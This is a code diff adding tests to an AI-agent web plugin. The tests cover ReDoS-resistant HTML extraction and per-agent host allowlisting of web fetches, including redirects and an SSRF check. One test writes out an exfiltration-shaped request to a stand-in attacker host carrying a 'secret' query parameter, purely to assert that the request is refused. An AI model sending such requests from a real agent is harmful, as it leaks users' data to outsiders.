@@ -2,11 +2,12 @@ import test from 'node:test';
 import assert from 'node:assert/strict';
 import http from 'node:http';
 import type { AddressInfo } from 'node:net';
+import { Worker } from 'node:worker_threads';
 
 import { HOSTILE_URLS } from '@stratusagent/egress';
 import { ToolRegistry, type JsonObject, type Session, type Tool } from '@stratusagent/core';
 
-import { createWebPlugin, htmlToText } from '../src/index.ts';
+import { createWebPlugin, extractTitle, htmlToText } from '../src/index.ts';
 
 const session: Session = {
   id: 'session-web',
@@ -223,4 +224,132 @@ test('the extractor keeps prose and drops furniture', () => {
   assert.equal(htmlToText('<p>He said <q>yes</q>, then left.</p>'), 'He said "yes", then left.');
   assert.equal(htmlToText('<p><q>yes</q><q>no</q></p>'), '"yes""no"');
   assert.equal(htmlToText('<script>var x = "<p>trap</p>";</script><p>real</p>'), 'real');
+});
+
+/**
+ * Runs the extractor on another thread, and gives up on it. The work is one
+ * synchronous call, so nothing on this thread — `node:test`'s own timeout
+ * included — gets a turn until it returns: a regression would not fail, it
+ * would finish minutes later and pass. A worker can be terminated mid-regex.
+ */
+const extractsWithin = (pages: string[], ms: number): Promise<boolean> => {
+  const source = new URL('../src/readability.ts', import.meta.url).href;
+  const worker = new Worker(
+    `const { parentPort, workerData } = require('node:worker_threads');
+     import(workerData.source).then(({ htmlToText, extractTitle }) => {
+       for (const page of workerData.pages) { htmlToText(page); extractTitle(page); }
+       parentPort.postMessage('done');
+     });`,
+    { eval: true, workerData: { source, pages } },
+  );
+  return new Promise<boolean>((resolve, reject) => {
+    const timer = setTimeout(() => {
+      void worker.terminate();
+      resolve(false);
+    }, ms);
+    worker.once('message', () => {
+      clearTimeout(timer);
+      void worker.terminate();
+      resolve(true);
+    });
+    worker.once('error', (error) => {
+      clearTimeout(timer);
+      reject(error);
+    });
+  });
+};
+
+test('a page of unclosed tags is extracted in one pass, not one rescan per tag', async () => {
+  // Each of these held the daemon's only thread for minutes before: a
+  // `[^>]*` with no `>` ahead of it scanned to the end of the page from
+  // every `<`, and a missing closer was hunted for from every opener. The
+  // budget is two orders of magnitude above the work — milliseconds — and
+  // far below what the old extraction took on any one of them.
+  const pages = [
+    '<a'.repeat(5_000),
+    '<script'.repeat(2_000),
+    '<p>x</p>' + '<script>'.repeat(50_000),
+    '<p>x</p>' + '<!--'.repeat(50_000),
+    '<title>' + '<title>'.repeat(50_000) + '>',
+  ];
+  assert.equal(await extractsWithin(pages, 10_000), true);
+  for (const page of pages) {
+    assert.equal(extractTitle(page), undefined);
+  }
+});
+
+test('the linear extraction reads a page exactly as the regexes did', () => {
+  // Text after the last `>` is text, and still has its entities decoded.
+  assert.equal(htmlToText('<p>maths</p> 5 < 10 &amp; 20'), 'maths\n5 < 10 & 20');
+  // A script with no end tag drops the tag and keeps what follows it, as
+  // the unclosed form always did; a closed one, in any case, goes whole.
+  assert.equal(htmlToText('<p>a</p><script>b'), 'a\nb');
+  assert.equal(htmlToText('<p>a</p><SCRIPT>gone()</Script><p>c</p>'), 'a\n\nc');
+  // An unclosed comment is left to the doctype sweep, as before.
+  assert.equal(htmlToText('<p>a</p><!-- open > b'), 'a\nb');
+  // A character whose lowercase is longer cannot shift where a span ends.
+  assert.equal(htmlToText('<p>İİİİ</p><script>secret()</script><p>after</p>'), 'İİİİ\n\nafter');
+  assert.equal(extractTitle('<title>İstanbul</title><p>x</p>'), 'İstanbul');
+  assert.equal(extractTitle('<TITLE>Kettles</TITLE>'), 'Kettles');
+});
+
+test('onlyHosts holds web.fetch to its list, per agent, redirect hops included', async (t) => {
+  // A listed host that bounces to one that is not: the hop is where an
+  // approver who saw the first URL stops seeing anything.
+  const server = http.createServer((request, response) => {
+    if (request.url === '/bounce') {
+      response.writeHead(302, { location: `http://127.0.0.1:${port}/landed` });
+      response.end();
+      return;
+    }
+    response.writeHead(200, { 'content-type': 'text/plain' });
+    response.end('reached');
+  });
+  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
+  t.after(() => new Promise<void>((resolve) => server.close(() => resolve())));
+  const port = (server.address() as AddressInfo).port;
+
+  const tool = await fetchTool({
+    allowedHosts: ['localhost'],
+    onlyHosts: ['localhost'],
+    // An allowedHosts entry stays reachable whatever onlyHosts says, so
+    // scout's narrower list has to drop the inherited exemption as well.
+    agents: {
+      scout: { onlyHosts: ['docs.python.org'], allowedHosts: [] },
+      // A fleet-wide list, lifted for one agent: an override replaces the
+      // default, so `*` is the way to say "no list" from under one.
+      ranger: { onlyHosts: ['*'] },
+    },
+  });
+
+  const reached = await tool.execute({ url: `http://localhost:${port}/` }, session) as JsonObject;
+  assert.equal(reached.text, 'reached');
+
+  // The exfiltration shape: a URL on a host nobody listed, carrying data.
+  await assert.rejects(
+    tool.execute({ url: 'https://attacker.example/?d=secret' }, session),
+    /attacker\.example is not one of the hosts this agent may reach/,
+  );
+  // The hop is refused by name — the host is judged before the address,
+  // so the message says which list it is missing from.
+  await assert.rejects(
+    tool.execute({ url: `http://localhost:${port}/bounce` }, session),
+    /127\.0\.0\.1 is not one of the hosts this agent may reach/,
+  );
+
+  // Per agent, resolved on the call: scout's list replaces the default.
+  const scout: Session = { ...session, id: 'session-scout', agent: { id: 'scout', name: 'Scout' } };
+  await assert.rejects(
+    tool.execute({ url: `http://localhost:${port}/` }, scout),
+    /localhost is not one of the hosts this agent may reach/,
+  );
+  // Refused by address, not by name: the list is lifted, the SSRF check
+  // that the inherited `allowedHosts` answers for localhost is not.
+  const ranger: Session = { ...session, id: 'session-ranger', agent: { id: 'ranger', name: 'Ranger' } };
+  await assert.rejects(
+    tool.execute({ url: 'http://127.0.0.1:1/?d=secret' }, ranger),
+    (error: unknown) => error instanceof Error && !/is not one of the hosts/.test(error.message),
+  );
+  const lifted = await tool.execute({ url: `http://localhost:${port}/` }, ranger) as JsonObject;
+  assert.equal(lifted.text, 'reached');
 });
